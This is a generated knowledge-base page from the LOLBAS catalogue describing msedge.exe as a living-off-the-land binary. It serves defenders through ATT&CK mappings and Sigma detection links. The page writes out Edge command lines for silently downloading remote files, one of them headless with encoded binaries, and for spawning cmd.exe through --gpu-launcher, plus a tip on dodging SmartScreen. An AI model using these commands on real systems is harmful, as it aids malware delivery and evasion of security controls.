---
title: "Msedge.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Msedge.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msedge.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Msedge.exe"
functions:
  - "Download"
  - "Execute"
attack_technique_ids:
  - "T1105"
  - "T1218.015"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Microsoft Edge browser

## Paths

- `c:\Program Files\Microsoft\Edge\Application\msedge.exe`
- `c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`

## Commands

### 1. Download

Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.

```cmd
msedge.exe {REMOTEURL:.exe.txt}
```

- Use Case: Download file from the internet
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 2. Download

Edge will silently download the file. File extension should be .html and binaries should be encoded.

```cmd
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
```

- Use Case: Download file from the internet
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 3. Execute

Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command

```cmd
msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

- Use Case: Executes a process under a trusted Microsoft signed binary
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218015-electron-applications|T1218.015: Electron Applications]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml

## Resources

- {'Link': 'https://twitter.com/mrd0x/status/1478116126005641220'}
- {'Link': 'https://twitter.com/mrd0x/status/1478234484881436672'}

## Acknowledgements

- {'Person': 'mr.d0x', 'Handle': '@mrd0x'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msedge.yml)
